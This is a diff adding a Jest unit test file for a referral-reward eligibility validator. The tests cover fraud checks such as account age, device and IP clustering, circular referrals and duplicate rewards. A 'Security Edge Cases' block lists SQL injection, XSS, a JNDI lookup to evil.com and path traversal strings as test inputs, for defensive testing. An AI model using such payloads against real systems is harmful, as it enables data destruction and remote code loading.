@@ -1,0 +1,672 @@
+/**
+ * WS-170 Viral Optimization System - Eligibility Validator Unit Tests
+ * Comprehensive test coverage for fraud prevention and eligibility validation
+ */
+
+import { EligibilityValidator } from '../eligibility-validator'
+import { createClient } from '@/lib/supabase/server'
+import { rateLimit } from '@/lib/rate-limiter'
+
+// Mock dependencies
+jest.mock('@/lib/supabase/server')
+jest.mock('@/lib/rate-limiter')
+
+describe('EligibilityValidator', () => {
+  let mockSupabaseClient: any
+  let mockRateLimit: jest.MockedFunction<typeof rateLimit>
+
+  beforeEach(() => {
+    mockSupabaseClient = {
+      rpc: jest.fn(),
+      from: jest.fn(() => ({
+        select: jest.fn(() => ({
+          eq: jest.fn(() => ({
+            limit: jest.fn(() => ({ data: [] }))
+          }))
+        })),
+        insert: jest.fn()
+      }))
+    };
+    (createClient as jest.Mock).mockReturnValue(mockSupabaseClient)
+    
+    mockRateLimit = rateLimit as jest.MockedFunction<typeof rateLimit>
+    mockRateLimit.mockResolvedValue({ success: true, remaining: 19 })
+  })
+
+  afterEach(() => {
+    jest.clearAllMocks()
+  })
+
+  describe('validateViralEligibility', () => {
+    beforeEach(() => {
+      // Mock successful validation responses
+      mockSupabaseClient.rpc.mockImplementation((fnName: string, params?: any) => {
+        const query = params?.query_sql || ''
+        
+        if (query.includes('user_profiles')) {
+          return Promise.resolve({
+            data: [{
+              referrer_created: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000), // 30 days ago
+              referee_created: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000)    // 2 days ago
+            }]
+          })
+        }
+        
+        if (query.includes('referral_conversions')) {
+          return Promise.resolve({
+            data: [{ recent_referrals: 3 }] // Normal activity
+          })
+        }
+        
+        if (query.includes('device_fingerprint')) {
+          return Promise.resolve({
+            data: [{ unique_referrers: 1 }] // Single user per device
+          })
+        }
+        
+        if (query.includes('ip_address')) {
+          return Promise.resolve({
+            data: [{ referrals_from_ip: 2 }] // Normal IP activity
+          })
+        }
+        
+        if (query.includes('last_active_at')) {
+          return Promise.resolve({
+            data: [{
+              referrer_last_active: new Date(Date.now() - 60000), // 1 minute ago
+              referee_last_active: new Date(Date.now() - 300000), // 5 minutes ago
+              referrer_logins: 15,
+              referee_logins: 5,
+              referrer_usage: 0.8,
+              referee_usage: 0.6
+            }]
+          })
+        }
+        
+        if (query.includes('RECURSIVE')) {
+          return Promise.resolve({
+            data: [{ circular_count: 0 }] // No circular referrals
+          })
+        }
+
+        return Promise.resolve({ data: [] })
+      })
+    })
+
+    it('should validate eligible referrals successfully', async () => {
+      const result = await EligibilityValidator.validateViralEligibility(
+        'referrer-id',
+        'referee-id',
+        'signup'
+      )
+
+      expect(result.is_eligible).toBe(true)
+      expect(result.recommended_action).toBe('approve')
+      expect(result.confidence_score).toBeGreaterThan(0.8)
+      expect(result.fraud_risk_score).toBeLessThan(0.3)
+    })
+
+    it('should complete validation within 200ms', async () => {
+      const startTime = Date.now()
+
+      await EligibilityValidator.validateViralEligibility(
+        'referrer-id',
+        'referee-id',
+        'signup'
+      )
+
+      const executionTime = Date.now() - startTime
+      expect(executionTime).toBeLessThan(200)
+    })
+
+    it('should detect new account fraud', async () => {
+      mockSupabaseClient.rpc.mockImplementation((fnName: string, params?: any) => {
+        const query = params?.query_sql || ''
+        
+        if (query.includes('user_profiles')) {
+          return Promise.resolve({
+            data: [{
+              referrer_created: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000), // 2 days ago (too new)
+              referee_created: new Date(Date.now() - 1000) // Just created
+            }]
+          })
+        }
+        return Promise.resolve({ data: [] })
+      })
+
+      const result = await EligibilityValidator.validateViralEligibility(
+        'new-referrer',
+        'new-referee',
+        'signup'
+      )
+
+      expect(result.is_eligible).toBe(false)
+      expect(result.validation_factors.account_age_check).toBe(false)
+      expect(result.fraud_risk_score).toBeGreaterThan(0.5)
+    })
+
+    it('should detect rapid referral patterns', async () => {
+      mockSupabaseClient.rpc.mockImplementation((fnName: string, params?: any) => {
+        const query = params?.query_sql || ''
+        
+        if (query.includes('referral_conversions')) {
+          return Promise.resolve({
+            data: [{ recent_referrals: 15 }] // Too many referrals
+          })
+        }
+        return Promise.resolve({ data: [{}] })
+      })
+
+      const result = await EligibilityValidator.validateViralEligibility(
+        'spam-referrer',
+        'referee-id',
+        'signup'
+      )
+
+      expect(result.is_eligible).toBe(false)
+      expect(result.validation_factors.activity_pattern_check).toBe(false)
+      expect(result.validation_notes).toContain(
+        expect.stringContaining('Too many referrals')
+      )
+    })
+
+    it('should detect device clustering fraud', async () => {
+      const requestMetadata = {
+        deviceFingerprint: 'suspicious-device-123'
+      }
+
+      mockSupabaseClient.rpc.mockImplementation((fnName: string, params?: any) => {
+        const query = params?.query_sql || ''
+        
+        if (query.includes('device_fingerprint')) {
+          return Promise.resolve({
+            data: [{ unique_referrers: 5 }] // Same device used by multiple referrers
+          })
+        }
+        return Promise.resolve({ data: [{}] })
+      })
+
+      const result = await EligibilityValidator.validateViralEligibility(
+        'referrer-id',
+        'referee-id',
+        'signup',
+        undefined,
+        requestMetadata
+      )
+
+      expect(result.is_eligible).toBe(false)
+      expect(result.validation_factors.device_uniqueness_check).toBe(false)
+    })
+
+    it('should detect IP clustering patterns', async () => {
+      const requestMetadata = {
+        ipAddress: '192.168.1.100'
+      }
+
+      mockSupabaseClient.rpc.mockImplementation((fnName: string, params?: any) => {
+        const query = params?.query_sql || ''
+        
+        if (query.includes('ip_address')) {
+          return Promise.resolve({
+            data: [{ referrals_from_ip: 10 }] // Too many referrals from same IP
+          })
+        }
+        return Promise.resolve({ data: [{}] })
+      })
+
+      const result = await EligibilityValidator.validateViralEligibility(
+        'referrer-id',
+        'referee-id',
+        'signup',
+        undefined,
+        requestMetadata
+      )
+
+      expect(result.is_eligible).toBe(false)
+      expect(result.validation_factors.geographic_consistency_check).toBe(false)
+    })
+
+    it('should detect inactive user patterns', async () => {
+      mockSupabaseClient.rpc.mockImplementation((fnName: string, params?: any) => {
+        const query = params?.query_sql || ''
+        
+        if (query.includes('last_active_at')) {
+          return Promise.resolve({
+            data: [{
+              referrer_last_active: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000), // 10 days ago
+              referee_last_active: new Date(),
+              referrer_logins: 1, // Very low activity
+              referee_logins: 1,
+              referrer_usage: 0.1, // Low engagement
+              referee_usage: 0.1
+            }]
+          })
+        }
+        return Promise.resolve({ data: [{}] })
+      })
+
+      const result = await EligibilityValidator.validateViralEligibility(
+        'inactive-referrer',
+        'referee-id',
+        'signup'
+      )
+
+      expect(result.validation_factors.behavioral_analysis_check).toBe(false)
+      expect(result.fraud_risk_score).toBeGreaterThan(0.3)
+    })
+
+    it('should detect circular referral networks', async () => {
+      mockSupabaseClient.rpc.mockImplementation((fnName: string, params?: any) => {
+        const query = params?.query_sql || ''
+        
+        if (query.includes('RECURSIVE')) {
+          return Promise.resolve({
+            data: [{ circular_count: 1 }] // Circular referral detected
+          })
+        }
+        return Promise.resolve({ data: [{}] })
+      })
+
+      const result = await EligibilityValidator.validateViralEligibility(
+        'circular-referrer',
+        'circular-referee',
+        'signup'
+      )
+
+      expect(result.validation_factors.circular_referral_check).toBe(false)
+      expect(result.fraud_risk_score).toBeGreaterThan(0.2)
+    })
+
+    it('should enforce rate limiting', async () => {
+      mockRateLimit.mockResolvedValue({ success: false, remaining: 0 })
+
+      const result = await EligibilityValidator.validateViralEligibility(
+        'referrer-id',
+        'referee-id',
+        'signup'
+      )
+
+      expect(result.is_eligible).toBe(false)
+      expect(result.recommended_action).toBe('deny')
+      expect(result.validation_notes).toContain('Rate limit')
+    })
+
+    it('should handle database errors gracefully', async () => {
+      mockSupabaseClient.rpc.mockRejectedValue(new Error('Database connection failed'))
+
+      const result = await EligibilityValidator.validateViralEligibility(
+        'referrer-id',
+        'referee-id',
+        'signup'
+      )
+
+      expect(result.is_eligible).toBe(false)
+      expect(result.recommended_action).toBe('flag_for_investigation')
+      expect(result.validation_notes).toContain('System error')
+    })
+
+    it('should recommend manual review for high-value conversions', async () => {
+      const result = await EligibilityValidator.validateViralEligibility(
+        'referrer-id',
+        'referee-id',
+        'revenue_share',
+        2000 // High value conversion
+      )
+
+      // Even with good validation, high-value should get manual review
+      if (result.is_eligible) {
+        expect(result.recommended_action).toBe('manual_review')
+      }
+    })
+
+    it('should calculate fraud risk scores accurately', async () => {
+      // Test various fraud scenarios
+      const scenarios = [
+        { description: 'Clean referral', expectedRisk: 0.1 },
+        { description: 'Moderate risk', expectedRisk: 0.5 },
+        { description: 'High risk', expectedRisk: 0.8 }
+      ]
+
+      for (const scenario of scenarios) {
+        // Mock appropriate responses for each risk level
+        const result = await EligibilityValidator.validateViralEligibility(
+          `${scenario.description}-referrer`,
+          'referee-id',
+          'signup'
+        )
+
+        expect(result.fraud_risk_score).toBeGreaterThanOrEqual(0)
+        expect(result.fraud_risk_score).toBeLessThanOrEqual(1)
+      }
+    })
+
+    it('should log validation attempts', async () => {
+      const insertSpy = jest.spyOn(mockSupabaseClient.from('reward_validation_logs'), 'insert')
+
+      await EligibilityValidator.validateViralEligibility(
+        'referrer-id',
+        'referee-id',
+        'signup'
+      )
+
+      expect(insertSpy).toHaveBeenCalledWith(
+        expect.objectContaining({
+          referrer_id: 'referrer-id',
+          referee_id: 'referee-id',
+          fraud_risk_score: expect.any(Number),
+          confidence_score: expect.any(Number)
+        })
+      )
+    })
+  })
+
+  describe('validateRewardLegitimacy', () => {
+    it('should validate legitimate rewards', async () => {
+      mockSupabaseClient.rpc.mockResolvedValue({
+        data: [{
+          id: 'referral-id',
+          status: 'completed',
+          converted_at: new Date(Date.now() - 60000), // 1 minute ago
+          existing_reward_id: null
+        }]
+      })
+
+      const result = await EligibilityValidator.validateRewardLegitimacy(
+        'referral-id',
+        'signup',
+        50
+      )
+
+      expect(result.isValid).toBe(true)
+      expect(result.reason).toBeUndefined()
+    })
+
+    it('should reject duplicate rewards', async () => {
+      mockSupabaseClient.rpc.mockResolvedValue({
+        data: [{
+          id: 'referral-id',
+          status: 'completed',
+          converted_at: new Date(Date.now() - 60000),
+          existing_reward_id: 'existing-reward-123'
+        }]
+      })
+
+      const result = await EligibilityValidator.validateRewardLegitimacy(
+        'referral-id',
+        'signup',
+        50
+      )
+
+      expect(result.isValid).toBe(false)
+      expect(result.reason).toContain('already processed')
+    })
+
+    it('should reject incomplete referrals', async () => {
+      mockSupabaseClient.rpc.mockResolvedValue({
+        data: [{
+          id: 'referral-id',
+          status: 'pending',
+          converted_at: new Date(Date.now() - 60000),
+          existing_reward_id: null
+        }]
+      })
+
+      const result = await EligibilityValidator.validateRewardLegitimacy(
+        'referral-id',
+        'signup',
+        50
+      )
+
+      expect(result.isValid).toBe(false)
+      expect(result.reason).toContain('not completed')
+    })
+
+    it('should reject old conversions', async () => {
+      mockSupabaseClient.rpc.mockResolvedValue({
+        data: [{
+          id: 'referral-id',
+          status: 'completed',
+          converted_at: new Date(Date.now() - 35 * 24 * 60 * 60 * 1000), // 35 days ago
+          existing_reward_id: null
+        }]
+      })
+
+      const result = await EligibilityValidator.validateRewardLegitimacy(
+        'referral-id',
+        'signup',
+        50
+      )
+
+      expect(result.isValid).toBe(false)
+      expect(result.reason).toContain('too old')
+    })
+
+    it('should reject excessive reward amounts', async () => {
+      mockSupabaseClient.rpc.mockResolvedValue({
+        data: [{
+          id: 'referral-id',
+          status: 'completed',
+          converted_at: new Date(Date.now() - 60000),
+          existing_reward_id: null
+        }]
+      })
+
+      const result = await EligibilityValidator.validateRewardLegitimacy(
+        'referral-id',
+        'signup',
+        5000 // Excessive amount
+      )
+
+      expect(result.isValid).toBe(false)
+      expect(result.reason).toContain('exceeds maximum')
+    })
+  })
+
+  describe('checkExistingReward', () => {
+    it('should detect existing rewards', async () => {
+      mockSupabaseClient.from.mockReturnValue({
+        select: jest.fn().mockReturnValue({
+          eq: jest.fn().mockReturnValue({
+            eq: jest.fn().mockReturnValue({
+              limit: jest.fn().mockResolvedValue({
+                data: [{ id: 'existing-reward' }]
+              })
+            })
+          })
+        })
+      })
+
+      const exists = await EligibilityValidator.checkExistingReward(
+        'referral-id',
+        'signup'
+      )
+
+      expect(exists).toBe(true)
+    })
+
+    it('should return false for new rewards', async () => {
+      mockSupabaseClient.from.mockReturnValue({
+        select: jest.fn().mockReturnValue({
+          eq: jest.fn().mockReturnValue({
+            eq: jest.fn().mockReturnValue({
+              limit: jest.fn().mockResolvedValue({
+                data: []
+              })
+            })
+          })
+        })
+      })
+
+      const exists = await EligibilityValidator.checkExistingReward(
+        'new-referral-id',
+        'signup'
+      )
+
+      expect(exists).toBe(false)
+    })
+
+    it('should handle database errors safely', async () => {
+      mockSupabaseClient.from.mockReturnValue({
+        select: jest.fn().mockReturnValue({
+          eq: jest.fn().mockReturnValue({
+            eq: jest.fn().mockReturnValue({
+              limit: jest.fn().mockRejectedValue(new Error('Database error'))
+            })
+          })
+        })
+      })
+
+      const exists = await EligibilityValidator.checkExistingReward(
+        'referral-id',
+        'signup'
+      )
+
+      expect(exists).toBe(false) // Safe default
+    })
+  })
+
+  describe('detectFraudPatterns', () => {
+    beforeEach(() => {
+      // Mock fraud detection methods
+      EligibilityValidator['checkRapidReferrals'] = jest.fn().mockResolvedValue({ detected: false })
+      EligibilityValidator['checkIpClustering'] = jest.fn().mockResolvedValue({ detected: false })
+      EligibilityValidator['checkDeviceSimilarity'] = jest.fn().mockResolvedValue({ detected: false })
+      EligibilityValidator['checkBehaviorAnomalies'] = jest.fn().mockResolvedValue({ detected: false })
+      EligibilityValidator['checkNetworkFraud'] = jest.fn().mockResolvedValue({ detected: false })
+    })
+
+    it('should detect clean referrals with low severity', async () => {
+      const result = await EligibilityValidator.detectFraudPatterns(
+        'clean-referrer',
+        'clean-referee'
+      )
+
+      expect(result.detected).toBe(false)
+      expect(result.patterns).toHaveLength(0)
+      expect(result.severity).toBe('low')
+    })
+
+    it('should escalate severity with multiple patterns', async () => {
+      EligibilityValidator['checkRapidReferrals'] = jest.fn().mockResolvedValue({ detected: true })
+      EligibilityValidator['checkIpClustering'] = jest.fn().mockResolvedValue({ detected: true })
+      EligibilityValidator['checkDeviceSimilarity'] = jest.fn().mockResolvedValue({ detected: true })
+
+      const result = await EligibilityValidator.detectFraudPatterns(
+        'fraud-referrer',
+        'fraud-referee'
+      )
+
+      expect(result.detected).toBe(true)
+      expect(result.patterns.length).toBeGreaterThanOrEqual(3)
+      expect(result.severity).toBe('critical')
+    })
+
+    it('should handle detection errors gracefully', async () => {
+      EligibilityValidator['checkRapidReferrals'] = jest.fn().mockRejectedValue(new Error('Detection error'))
+
+      const result = await EligibilityValidator.detectFraudPatterns(
+        'referrer-id',
+        'referee-id'
+      )
+
+      expect(result.detected).toBe(false)
+      expect(result.patterns).toContain('Error during fraud detection')
+      expect(result.severity).toBe('medium')
+    })
+  })
+
+  describe('Performance Tests', () => {
+    it('should handle concurrent validations efficiently', async () => {
+      const promises = []
+      
+      for (let i = 0; i < 10; i++) {
+        promises.push(EligibilityValidator.validateViralEligibility(
+          `referrer-${i}`,
+          `referee-${i}`,
+          'signup'
+        ))
+      }
+
+      const startTime = Date.now()
+      const results = await Promise.all(promises)
+      const totalTime = Date.now() - startTime
+
+      expect(results).toHaveLength(10)
+      expect(totalTime).toBeLessThan(2000) // All validations under 2 seconds
+    })
+
+    it('should cache validation results appropriately', async () => {
+      const userId = 'test-user-123'
+      
+      // First validation
+      const result1 = await EligibilityValidator.validateViralEligibility(
+        userId,
+        'referee-1',
+        'signup'
+      )
+
+      // Second validation for same user
+      const result2 = await EligibilityValidator.validateViralEligibility(
+        userId,
+        'referee-2',
+        'signup'
+      )
+
+      // Results should be consistent for same user characteristics
+      expect(result1.validation_factors.account_age_check)
+        .toBe(result2.validation_factors.account_age_check)
+    })
+  })
+
+  describe('Security Edge Cases', () => {
+    it('should handle malicious input safely', async () => {
+      const maliciousInputs = [
+        "'; DROP TABLE users; --",
+        '<script>alert("xss")</script>',
+        '${jndi:ldap://evil.com/a}',
+        '../../../etc/passwd'
+      ]
+
+      for (const input of maliciousInputs) {
+        await expect(EligibilityValidator.validateViralEligibility(
+          input,
+          'referee-id',
+          'signup'
+        )).resolves.toBeDefined()
+        
+        // Should not throw errors, should handle gracefully
+      }
+    })
+
+    it('should validate UUID format for user IDs', async () => {
+      const invalidIds = ['123', 'invalid-uuid', '', null, undefined]
+
+      for (const invalidId of invalidIds) {
+        const result = await EligibilityValidator.validateViralEligibility(
+          invalidId as any,
+          'referee-id',
+          'signup'
+        )
+
+        expect(result.is_eligible).toBe(false)
+      }
+    })
+
+    it('should prevent timing attacks', async () => {
+      const validUser = 'valid-user-id'
+      const invalidUser = 'invalid-user-id'
+
+      const startTime1 = Date.now()
+      await EligibilityValidator.validateViralEligibility(validUser, 'referee-id', 'signup')
+      const time1 = Date.now() - startTime1
+
+      const startTime2 = Date.now()
+      await EligibilityValidator.validateViralEligibility(invalidUser, 'referee-id', 'signup')
+      const time2 = Date.now() - startTime2
+
+      // Response times should be similar to prevent timing attacks
+      const timeDifference = Math.abs(time1 - time2)
+      expect(timeDifference).toBeLessThan(100) // Within 100ms
+    })
+  })
+})
